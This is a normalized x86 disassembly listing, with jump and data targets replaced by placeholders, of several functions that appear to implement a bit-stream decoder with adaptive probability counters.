mov [ esi + 0x48 ] ecx
or [ esi + 0x3c ] edx
cmp ebx ecx
jg r-xdata
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
sub ebx ebp
mov edi ebp
mov [ esi + 0xfa4 ] 0x0
je r-xdata
mov [ esi + 0xfa4 ] ebx
jmp r-xdata
sar eax 0x18
movsx ebx [ eax + r--data ]
add ebx edi
sar eax 0x10
movsx ebx [ eax + r--data ]
add ebx 0x10
jmp r-xdata
cmp [ esp + 0xc ] edi
mov ebp [ ebx * 4 + r--data ]
jne r-xdata
cmp ebx [ esi + 0x48 ]
jle r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esi + ecx * 4 + 0xfa8 ]
lea edx [ eax + 0x20 ]
shr edx 0x6
sub eax edx
add eax edi
test edi edi
mov [ esi + ecx * 4 + 0xfa8 ] eax
je r-xdata
or [ esi + 0xfa4 ] edi
lea ecx [ ecx ]
cmp [ esi + 0xfa4 ] 0x0
je r-xdata
mov eax [ esi + ecx * 4 + 0xfb8 ]
add eax 0x10
shr eax 0x5
cmp eax 0x100
jge r-xdata
cmp [ esi + 0x48 ] edi
jge r-xdata
mov eax [ esi + 0x48 ]
cmp eax 0x20
mov edi [ esi + 0x3c ]
jle r-xdata
jmp r-xdata
mov eax edi
pop edi
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn 0x4
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
cmp eax 0x10000
jge r-xdata
movsx ebx [ eax + r--data ]
jmp r-xdata
mov eax [ esi + 0x48 ]
cmp eax 0x20
mov edi [ esi + 0x3c ]
jle r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
sub eax ebx
mov ecx ebx
shr [ esi + 0x3c ] cl
mov [ esi + 0x48 ] eax
and edi [ ebx * 4 + r--data ]
jmp r-xdata
mov ecx [ esi + 0x30 ]
sub eax ebx
mov [ esi + 0x48 ] eax
movzx edx [ ecx ]
mov ecx 0x8
sub cl al
shr edx cl
mov [ esi + 0x3c ] edx
and edi [ ebx * 4 + r--data ]
jmp r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov eax [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ eax ]
mov [ esi + 0x3c ] eax
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
cmp eax 0x1000000
jge r-xdata
sar eax 0x8
movsx ebx [ eax + r--data ]
add ebx 0x8
jmp r-xdata
cmp ebx [ esi + 0x48 ]
jle r-xdata
add eax 0xffffffe8
mov [ esi + 0x48 ] eax
movzx eax [ esi + 0x3f ]
mov [ esi + 0x3c ] eax
and edi 0xffffff
jmp r-xdata
mov ecx [ esi + 0x30 ]
add eax 0xffffffe8
mov [ esi + 0x48 ] eax
movzx edx [ ecx ]
mov ecx 0x8
sub cl al
shr edx cl
and edi 0xffffff
mov [ esi + 0x3c ] edx
jmp r-xdata
mov edx [ esi + 0x30 ]
movzx eax [ edx ]
mov ecx [ esi + 0x48 ]
shl eax cl
add ecx 0x8
mov [ esi + 0x48 ] ecx
or [ esi + 0x3c ] eax
cmp ecx edi
jl r-xdata
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
mov ecx [ esp + 0x18 ]
mov eax [ esi + ecx * 4 + 0xfb0 ]
lea edx [ eax + 0x10 ]
shr edx 0x5
sub eax edx
add eax edi
add edi [ esp + 0x10 ]
mov [ esi + ecx * 4 + 0xfb0 ] eax
mov edx [ esi + 0x30 ]
movzx eax [ edx ]
mov ecx [ esi + 0x48 ]
shl eax cl
add ecx 0x8
mov [ esi + 0x48 ] ecx
or [ esi + 0x3c ] eax
cmp ebx ecx
jg r-xdata
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax 0x1
test eax eax
je r-xdata
add edi edi
sub ebx ebp
jne r-xdata
or [ esi + 0xfa4 ] edi
sar eax 0x18
movsx ebx [ eax + r--data ]
add ebx edi
sar eax 0x10
movsx ebx [ eax + r--data ]
add ebx 0x10
jmp r-xdata
mov eax [ esi + 0x48 ]
cmp eax 0x20
mov edx [ esi + 0x3c ]
jle r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esi + ecx * 4 + 0xfb8 ]
lea edx [ eax + 0x8 ]
shr edx 0x4
sub eax edx
add eax edi
mov [ esi + ecx * 4 + 0xfb8 ] eax
add edi ebp
neg edi
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
sub eax ebx
mov ecx ebx
shr [ esi + 0x3c ] cl
mov [ esi + 0x48 ] eax
mov ecx [ esi + 0x30 ]
sub eax ebx
mov [ esi + 0x48 ] eax
movzx edi [ ecx ]
mov ecx 0x8
sub cl al
shr edi cl
mov [ esi + 0x3c ] edi
jmp r-xdata
mov eax [ esi + 0x30 ]
movzx edx [ eax ]
mov ecx [ esi + 0x48 ]
shl edx cl
add ecx 0x8
mov [ esi + 0x48 ] ecx
or [ esi + 0x3c ] edx
cmp ebx ecx
jg r-xdata
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
mov eax [ esp + 0xc ]
mov ecx [ ebx * 4 + r--data ]
lea edi [ eax - 0x2 ]
imul edi [ ebx * 4 + r--data ]
and ecx edx
add edi ecx
sub_4060c0
push ecx
push ebx
mov ebx eax
cmp [ esi + ebx * 4 + 0xf8c ] 0x0
push ebp
push edi
jne r-xdata
add [ esi + ebx * 4 + 0xf8c ] 0x1
cmp [ esi + ebx * 4 + 0xf8c ] 0x80
jne r-xdata
mov ebp [ esi + ebx * 4 + 0xf9c ]
add ebp 0x80
shr ebp 0x8
xor edi edi
mov ebx [ esi + ebx * 4 + 0xf94 ]
cmp ebx [ esi + 0x48 ]
jle r-xdata
mov [ esi + ebx * 4 + 0xf8c ] 0x0
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov eax [ esi + 0x48 ]
cmp eax 0x20
mov ecx [ esi + 0x3c ]
mov [ esp + 0xc ] ecx
jle r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax 0x1
test eax eax
je r-xdata
sub eax ebx
mov ecx ebx
shr [ esi + 0x3c ] cl
mov [ esi + 0x48 ] eax
mov edx [ esi + 0x30 ]
sub eax ebx
mov [ esi + 0x48 ] eax
movzx edx [ edx ]
mov ecx 0x8
sub cl al
shr edx cl
mov [ esi + 0x3c ] edx
jmp r-xdata
mov edx [ esi + 0x30 ]
movzx eax [ edx ]
mov ecx [ esi + 0x48 ]
shl eax cl
add ecx 0x8
mov [ esi + 0x48 ] ecx
or [ esi + 0x3c ] eax
cmp ebx ecx
jg r-xdata
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
cmp edi 0x48
jne r-xdata
add edi 0x1
cmp edi 0x48
jl r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
xor ebp ebp
mov eax 0x55555556
imul edi
mov eax edx
shr eax 0x1f
add eax edx
lea edx [ eax + eax * 2 ]
mov ecx edi
sub ecx edx
cmp ecx 0x1
jne r-xdata
pop edi
pop ebp
mov eax 0x80000000
pop ebx
pop ecx
retn
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax 0x1
test eax eax
je r-xdata
lea ecx [ edi + 0x1 ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add eax edx
sub edi eax
add edi ebp
mov [ esi + ebx * 4 + 0xf94 ] edi
sub ebp eax
sub ebp 0x1
mov [ esi + ebx * 4 + 0xf94 ] ebp
jmp r-xdata
cmp ebp 0x20
je r-xdata
add ebp 0x1
cmp ebp 0x20
jb r-xdata
mov eax [ esi + ebx * 4 + 0xf9c ]
mov edx [ esi + ebx * 4 + 0xf94 ]
add edx edx
add edx edx
lea ecx [ eax + 0x10 ]
shr ecx 0x5
add edx edx
sub edx ecx
add edx eax
mov [ esi + ebx * 4 + 0xf9c ] edx
mov edi [ ebx * 4 + r--data ]
mov edx [ ebx * 4 + r--data ]
imul edi ebp
and edx [ esp + 0xc ]
add edi edx
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax 0x1
test eax eax
je r-xdata
neg edi
sub_406300
push ecx
push ebx
push ebp
mov ebp 0x1
push edi
mov edi eax
mov [ esp + 0xc ] ebp
xor ebx ebx
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
add ebx 0x2
cmp ebx 0x32
jne r-xdata
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
pop edi
pop ebp
mov eax 0x80000000
pop ebx
pop ecx
retn
mov eax [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ eax ]
mov [ esi + 0x3c ] eax
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
add ebx ebp
test bl 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
cdq
sub eax edx
sar eax 0x1
cmp [ esi + edi * 4 + 0xfc8 ] 0x0
jg r-xdata
lea eax [ ebx + 0x1 ]
cdq
sub eax edx
sar eax 0x1
cmp [ esi + edi * 4 + 0xfc8 ] 0x0
jle r-xdata
add [ esi + edi * 4 + 0xfc0 ] eax
mov eax [ esi + edi * 4 + 0xfc0 ]
cmp eax 0x14
ja r-xdata
neg eax
mov [ esi + edi * 4 + 0xfc8 ] eax
jmp r-xdata
neg eax
test eax eax
jne r-xdata
lea ecx [ eax - 0x1 ]
mov ebx ebp
shl ebx cl
cmp [ esi + 0xa ] 0x0
mov edi ecx
je r-xdata
pop edi
pop ebp
pop ebx
pop ecx
retn
test edi edi
je r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
lea esp [ esp ]
lea ecx [ ecx ]
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
shl [ esp + 0xc ] 0x1
sub edi ebp
jne r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
mov edx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ edx ]
mov [ esi + 0x3c ] eax
mov ecx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call ecx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
movsx ecx [ esi + 0xa ]
cmp edi ecx
jge r-xdata
jmp r-xdata
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
pop edi
pop ebp
mov eax ebx
pop ebx
pop ecx
retn
neg ebx
shl [ esp + 0xc ] 0x1
sub edi ebp
jne r-xdata
or ebx [ esp + 0xc ]
mov eax [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ eax ]
mov [ esi + 0x3c ] eax
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
or ebx [ esp + 0xc ]
sub_406520
push ebx
push ebp
push edi
xor edi edi
mov ebp 0x1
mov ebx 0x7
nop
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] ebx
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
cmp edi 0x48
je r-xdata
add edi ebp
cmp edi 0x48
jl r-xdata
pop edi
pop ebp
mov eax 0x80000000
pop ebx
retn 0x4
test edi edi
jne r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
add edi ebp
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov eax 0x55555556
imul edi
mov eax edx
shr eax 0x1f
add eax edx
sub eax edi
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov ecx [ esi + 0xfd4 ]
mov edx ecx
sar edx 0x8
lea edi [ edx + eax + 0x1 ]
lea eax [ ecx + 0x10 ]
sar eax 0x5
lea edx [ edi * 8 ]
sub edx eax
add edx ecx
mov [ esi + 0xfd4 ] edx
mov ecx [ esi + 0xfd8 ]
mov edx ecx
sar edx 0x8
lea edi [ edx + eax + 0x1 ]
lea eax [ ecx + 0x10 ]
sar eax 0x5
lea edx [ edi * 8 ]
sub edx eax
add edx ecx
mov [ esi + 0xfd8 ] edx
jmp r-xdata
mov eax [ esi + 0x30 ]
mov [ esi + 0x48 ] ebx
movzx eax [ eax ]
mov [ esi + 0x3c ] eax
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
test edi edi
jne r-xdata
cmp edi 0x18
ja r-xdata
lea eax [ edi + 0x1 ]
cdq
mov ecx 0x3
idiv ecx
test edx edx
je r-xdata
movzx eax [ esi + 0xa ]
test ax ax
je r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
retn 0x4
cmp edi [ esi + 0x48 ]
jle r-xdata
movsx eax ax
cmp edi eax
jle r-xdata
mov eax [ esi + 0x48 ]
cmp eax 0x20
mov edx [ esi + 0x3c ]
jle r-xdata
lea ebx [ ebx ]
cmp eax [ esi + 0x48 ]
jle r-xdata
sub eax edi
mov ecx edi
shr [ esi + 0x3c ] cl
mov [ esi + 0x48 ] eax
mov ecx [ esi + 0x30 ]
sub eax edi
mov [ esi + 0x48 ] eax
movzx ebx [ ecx ]
mov ecx 0x8
sub cl al
shr ebx cl
mov [ esi + 0x3c ] ebx
jmp r-xdata
mov eax [ esi + 0x30 ]
movzx edx [ eax ]
mov ecx [ esi + 0x48 ]
shl edx cl
add ecx 0x8
mov [ esi + 0x48 ] ecx
or [ esi + 0x3c ] edx
cmp edi ecx
jg r-xdata
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
mov eax [ esi + 0x48 ]
cmp eax 0x20
mov ebx [ esi + 0x3c ]
movsx edx [ esi + 0xa ]
jle r-xdata
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
mov eax [ edi * 4 + r--data ]
pop edi
and eax edx
pop ebp
or eax ecx
pop ebx
retn 0x4
mov eax [ edi * 4 + r--data ]
pop edi
and eax edx
pop ebp
neg eax
pop ebx
retn 0x4
mov ecx [ edi * 4 + r--data ]
test edx ecx
je r-xdata
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
sub eax edx
mov ecx edx
shr [ esi + 0x3c ] cl
mov [ esi + 0x48 ] eax
mov ecx [ esi + 0x30 ]
sub eax edx
mov [ esi + 0x48 ] eax
movzx ebp [ ecx ]
mov ecx 0x8
sub cl al
shr ebp cl
mov [ esi + 0x3c ] ebp
jmp r-xdata
mov edx [ esi + 0x30 ]
movzx eax [ edx ]
mov ecx [ esi + 0x48 ]
shl eax cl
add ecx 0x8
mov [ esi + 0x48 ] ecx
or [ esi + 0x3c ] eax
movsx ecx [ esi + 0xa ]
cmp ecx [ esi + 0x48 ]
jg r-xdata
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
mov eax [ edx * 4 + r--data ]
and eax ebx
or eax ecx
mov ecx edi
pop edi
sub ecx edx
pop ebp
shl eax cl
pop ebx
retn 0x4
mov eax [ edx * 4 + r--data ]
and eax ebx
mov ecx edi
pop edi
neg eax
sub ecx edx
pop ebp
shl eax cl
pop ebx
retn 0x4
mov ecx [ edx * 4 + r--data ]
test ebx ecx
je r-xdata
sub_4067b0
mov ecx eax
shr ecx 0x9
add eax ecx
cmp eax 0x100
jae r-xdata
cmp eax 0x10000
jae r-xdata
movsx edx [ eax + r--data ]
mov ecx 0x9
sub ecx edx
shl eax cl
shl edx 0x8
and eax 0xff
add eax edx
retn
cmp eax 0x1000000
jae r-xdata
mov edx eax
shr edx 0x8
movsx edx [ edx + r--data ]
add edx 0x8
lea ecx [ edx - 0x9 ]
shr eax cl
shl edx 0x8
and eax 0xff
add eax edx
retn
mov edx eax
shr edx 0x18
movsx edx [ edx + r--data ]
add edx 0x18
lea ecx [ edx - 0x9 ]
shr eax cl
shl edx 0x8
and eax 0xff
add eax edx
retn
mov ecx eax
shr ecx 0x10
movsx edx [ ecx + r--data ]
add edx 0x10
lea ecx [ edx - 0x9 ]
shr eax cl
shl edx 0x8
and eax 0xff
add eax edx
retn
sub_406850
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax + 0x19c ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x884 ]
test eax eax
je r-xdata
test [ esi + 0xc ] 0x80
push edi
je r-xdata
push eax
call sub_40fdab
add esp 0x4
mov eax [ esi + 0x28 ]
test eax eax
lea edi [ esi + 0x24 ]
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
lea edi [ esi + 0x50 ]
je r-xdata
push esi
call sub_40fdab
add esp 0x4
pop edi
push eax
call sub_40fdab
push 0x2c
push 0x0
push edi
call sub_40fb30
add esp 0x10
push eax
call sub_40fdab
push 0x2c
push 0x0
push edi
call sub_40fb30
add esp 0x10
sub_4068c0
push ebx
push esi
push edi
mov esi eax
movsx ebx [ esi + 0xc ]
push 0x6c0
lea edi [ esi + 0x8cc ]
push 0x0
push edi
call sub_40fb30
push 0x40
lea eax [ esi + 0x88c ]
push 0x0
push eax
call sub_40fb30
add esp 0x18
test ebx 0x8000
mov eax edi
je r-xdata
test ebx 0x2000
je r-xdata
mov ecx r--data
mov edi 0x3
mov [ eax ] 0x1
mov [ eax + 0x60 ] 0x1
mov [ eax + 0xc0 ] 0x1
mov [ eax + 0x120 ] 0x1
add eax 0x180
mov ecx ebx
and ecx 0x1000
je r-xdata
movsx edx dl
mov [ eax ] edx
add eax 0x60
test ebx 0x1000
je r-xdata
mov [ eax ] 0x1
add eax 0x60
mov [ eax ] 0x2
add eax 0x60
test ecx ecx
je r-xdata
mov [ eax ] 0xfffffffe
add eax 0x60
movsx edx dl
mov [ eax ] edx
add eax 0x60
test ebx 0x1000
je r-xdata
mov dl [ ecx ]
test dl dl
jg r-xdata
mov [ eax ] 0x1
add eax 0x60
mov [ eax ] 0x1
add eax 0x60
mov [ eax ] 0x1
add eax 0x60
jmp r-xdata
mov [ eax ] 0xffffffff
add eax 0x60
movsx edx dl
mov [ eax ] edx
add eax 0x60
test ebx 0x1000
je r-xdata
mov dl [ ecx - 0x1 ]
test dl dl
jg r-xdata
sub eax esi
sub eax 0x8cc
mov ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esi + 0x80 ] eax
call sub_405aa0
pop edi
pop esi
pop ebx
retn
movsx edx dl
mov [ eax ] edx
add eax 0x60
test ebx 0x1000
je r-xdata
mov dl [ ecx - 0x2 ]
test dl dl
jg r-xdata
movsx edx dl
mov [ eax ] edx
add eax 0x60
test ebx 0x1000
je r-xdata
mov dl [ ecx - 0x3 ]
test dl dl
jg r-xdata
movsx edx dl
mov [ eax ] edx
add eax 0x60
test ebx 0x1000
je r-xdata
mov dl [ ecx - 0x4 ]
test dl dl
jg r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
jg r-xdata
jmp r-xdata
sub ecx 0x6
sub edi 0x1
jne r-xdata
sub_406a50
sub esp 0x10
push ebx
push edi
xor edi edi
mov ebx 0x1
lea esp [ esp ]
add [ esi + 0x30 ] ebx
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebx
test eax eax
je r-xdata
cmp edi 0x19
mov [ esp + 0xc ] edi
jne r-xdata
add edi ebx
cmp edi 0x19
jb r-xdata
cmp edi 0x18
push ebp
jne r-xdata
pop edi
mov eax 0x80000000
pop ebx
add esp 0x10
retn 0x8
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
xor ebp ebp
lea ebx [ ebx ]
mov ebx [ esp + 0x20 ]
mov ecx [ esi + ebx * 4 + 0xfe0 ]
add ecx 0x30
mov eax 0xaaaaaaab
mul ecx
mov eax [ esi + ebx * 4 + 0xff0 ]
mov edi edx
mov ecx eax
and eax 0xff
shr edi 0x6
sar ecx 0x8
test edi edi
mov [ esi + ebx * 4 + 0xff0 ] eax
mov ebx [ esp + 0x10 ]
mov [ esp + 0x18 ] ecx
jne r-xdata
movzx eax [ esi + 0xc ]
test al 0x1
mov eax [ esi + 0xfe8 ]
je r-xdata
add [ esi + 0x30 ] ebx
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov eax [ esi + 0x48 ]
lea ebx [ ebx + ebx + 0x1 ]
imul ebx edi
test eax eax
mov [ esp + 0xc ] ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_4067b0
mov ebx eax
mov eax [ esi + 0xfec ]
call sub_4067b0
mov edi eax
movzx eax [ esi + 0xc ]
mov [ esp + 0x18 ] edi
sub edi ebx
test eax 0x4000
je r-xdata
call sub_4067b0
mov edi [ esi + 0xff8 ]
sub edi eax
mov eax [ esi + 0xfe0 ]
call sub_4067b0
lea eax [ edi + eax + 0x300 ]
add [ esi + 0xff0 ] eax
jns r-xdata
mov eax [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ eax ]
mov [ esi + 0x3c ] eax
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebx
test eax eax
je r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
xor ebp ebp
xor ebx ebx
mov [ esp + 0x10 ] ebp
jmp r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
add edi 0x1
add edi 0x101
jmp r-xdata
mov [ esi + 0xff0 ] 0x0
jmp r-xdata
cmp ebp 0x21
jne r-xdata
add ebp ebx
cmp ebp 0x21
jl r-xdata
mov edx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ edx ]
mov [ esi + 0x3c ] eax
mov ecx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call ecx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax 0x1
test eax eax
je r-xdata
mov [ esp + 0x14 ] ebp
mov [ esp + 0xc ] ebx
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
xor edi edi
cmp ecx edi
jge r-xdata
xor eax eax
mov [ esi + 0xff4 ] eax
jmp r-xdata
mov eax [ esi + 0xfe0 ]
mov ebp [ esi + 0xff8 ]
sar edi 0x1
call sub_4067b0
mov ecx ebp
sub ecx edi
sub ecx ebx
lea edx [ eax + ecx + 0x300 ]
mov eax [ esi + 0xfe4 ]
add [ esi + 0xff0 ] edx
call sub_4067b0
sub ebp [ esp + 0x18 ]
mov ecx [ esi + 0xff0 ]
add eax edi
lea eax [ eax + ebp + 0x300 ]
add [ esi + 0xff4 ] eax
mov edx [ esi + 0xff4 ]
lea eax [ edx + ecx ]
test eax eax
jge r-xdata
cmp ebp 0x2
jge r-xdata
pop ebp
pop edi
mov eax 0x80000000
pop ebx
add esp 0x10
retn 0x8
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov ebp ebx
sub ebp edi
cmp [ esp + 0x18 ] 0x0
lea eax [ ebx + edi - 0x1 ]
mov [ esp + 0x14 ] ebp
mov [ esp + 0x10 ] eax
je r-xdata
neg ebx
mov [ esp + 0xc ] ebx
mov eax [ esp + 0xc ]
pop ebp
pop edi
pop ebx
add esp 0x10
retn 0x8
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
mov eax [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ eax ]
mov [ esi + 0x3c ] eax
mov edx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call edx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax 0x1
test eax eax
je r-xdata
cmp edx edi
jge r-xdata
mov [ esi + 0xff4 ] eax
mov [ esi + 0xff0 ] edi
